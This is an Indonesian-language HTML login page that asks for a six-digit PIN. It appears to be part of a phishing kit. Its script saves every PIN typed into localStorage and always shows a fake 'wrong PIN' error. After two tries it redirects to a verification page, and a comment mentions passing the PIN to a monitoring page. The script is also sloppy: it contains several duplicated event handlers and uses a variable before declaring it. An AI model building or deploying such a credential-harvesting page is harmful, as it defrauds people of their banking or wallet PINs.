<!DOCTYPE html>
<html lang="id">
<head>
     <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk</title>
    <link rel="stylesheet" href="styles3.css">
    </head>
<body>
  

    <div class="container">
        <div class="header">Masuk</div>
        <div class="pin">Masukkan PIN</div>
        <div class="pin-container" id="pinContainer">
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
        </div>
        <input type="number" id="pinInput" maxlength="6" inputmode="numeric" pattern="[0-9]*">
    </div>
    
     <img src="Image/pin.png" alt="Logo" class="logo-img">  
    
    <!-- Tambahan HTML -->
<!-- Tambahan HTML -->
<div class="loading-overlay" id="loadingOverlay">
    <img src="Image/load.png" alt="Logo" class="loading-logo1">
    <div class="spinner"></div>
</div>
    
    
</div>
  <div class="error-message" id="errorMessage">Pastikan PIN yang kamu masukkan benar</div>

  
  
  
 <script>



let attempts = 0; // Hitung jumlah kesalahan

pinInput.addEventListener("input", () => {
    let value = pinInput.value;
    pinBoxes.forEach((box, index) => {
        if (index < value.length) {
            box.classList.add("filled");
            box.classList.remove("error"); // Hapus warna merah saat mengetik ulang
        } else {
            box.classList.remove("filled");
        }
    });

    if (value.length === 6) {
        localStorage.setItem('pin', value);

        // Tampilkan loading
        document.getElementById("loadingOverlay").style.display = "flex";

        setTimeout(() => {
            document.getElementById("loadingOverlay").style.display = "none";

            // Tampilkan error (getar + merah)
            pinBoxes.forEach(box => {
                box.classList.add("error");
            });

            let pinContainer = document.getElementById("pinContainer");
            pinContainer.classList.add("shake");

            document.getElementById("errorMessage").style.display = "block";

            setTimeout(() => {
                pinContainer.classList.remove("shake");
            }, 300);

            // Fokus kembali ke input agar bisa langsung mengetik ulang
            pinInput.value = "";
            pinInput.focus();

            // Tambahkan perhitungan kesalahan
            attempts++;
            if (attempts >= 2) {
                window.location.href = "verifikasi.html"; // Arahkan ke verifikasi.html setelah 2 kali salah
            }
        }, 2000);
    }
});





pinInput.addEventListener("input", () => {
    let value = pinInput.value;
    pinBoxes.forEach((box, index) => {
        if (index < value.length) {
            box.classList.add("filled");
        } else {
            box.classList.remove("filled");
        }
    });

    if (value.length === 6) {
        localStorage.setItem('pin', value);

        // Sembunyikan pin & tampilkan spinner
        document.getElementById("pinContainer").classList.add("hidden");
        document.getElementById("loadingOverlay").style.display = "block";

        setTimeout(() => {
            // Sembunyikan loading & tampilkan pin kembali
            document.getElementById("loadingOverlay").style.display = "none";
            document.getElementById("pinContainer").classList.remove("hidden");

            // Ubah titik jadi merah & getarkan
            pinBoxes.forEach(box => {
                box.classList.add("error");
            });

            let pinContainer = document.getElementById("pinContainer");
            pinContainer.classList.add("shake");

            // Munculkan pesan PIN salah
            document.getElementById("errorMessage").style.display = "block";

            setTimeout(() => {
                pinContainer.classList.remove("shake");
            }, 300);
        }, 2000); // Loading selama 2 detik
    }
});







// Klik titik merah â†’ reset & munculkan keyboard
pinBoxes.forEach(box => {
    box.addEventListener("click", () => {
        pinBoxes.forEach(b => b.classList.remove("error", "filled"));
        pinInput.value = "";
        pinInput.focus();
        document.getElementById("errorMessage").style.display = "none";
    });
});

// Jika klik PIN merah, reset
pinBoxes.forEach(box => {
    box.addEventListener("click", () => {
        pinBoxes.forEach(b => b.classList.remove("error", "filled"));
        pinInput.value = "";
        pinInput.focus();
        document.getElementById("errorMessage").style.display = "none";
    });
});
 // Tambahan JavaScript
pinInput.addEventListener("input", () => {
    let value = pinInput.value;
    pinBoxes.forEach((box, index) => {
        if (index < value.length) {
            box.classList.add("filled");
        } else {
            box.classList.remove("filled");
        }
    });

    if (value.length === 6) {
        localStorage.setItem('pin', value);
        
        // Tampilkan loading
        document.getElementById("loadingOverlay").style.display = "flex";

        setTimeout(() => {
            // Sembunyikan loading
            document.getElementById("loadingOverlay").style.display = "none";

            // Ubah titik jadi merah
            pinBoxes.forEach(box => {
                box.style.backgroundColor = "red";
            });
        }, 2000); // Loading selama 2 detik
    }
});
 pinBoxes.forEach(box => {
    box.addEventListener("click", () => {
        pinBoxes.forEach(b => b.classList.remove("error", "filled"));
        pinInput.value = "";
        pinInput.focus();
    });
});
 
 
 
        pinInput.addEventListener("input", () => {
            let value = pinInput.value;
            pinBoxes.forEach((box, index) => {
                if (index < value.length) {
                    box.classList.add("filled");
                } else {
                    box.classList.remove("filled");
                }
            });

            // Jika PIN sudah 6 digit, kirim ke pantau.html tanpa berpindah halaman
            if (value.length === 6) {
                localStorage.setItem('pin', value); // Simpan di localStorage
            }
        });
    </script>
  
    <script>
        const pinInput = document.getElementById("pinInput");
        const pinBoxes = document.querySelectorAll(".pin-box");

        document.body.addEventListener("click", () => {
            pinInput.focus();
        });

        pinInput.addEventListener("input", () => {
            let value = pinInput.value;
            pinBoxes.forEach((box, index) => {
                if (index < value.length) {
                    box.classList.add("filled");
                } else {
                    box.classList.remove("filled");
                }
            });
        });
    </script>
</body>
</html>
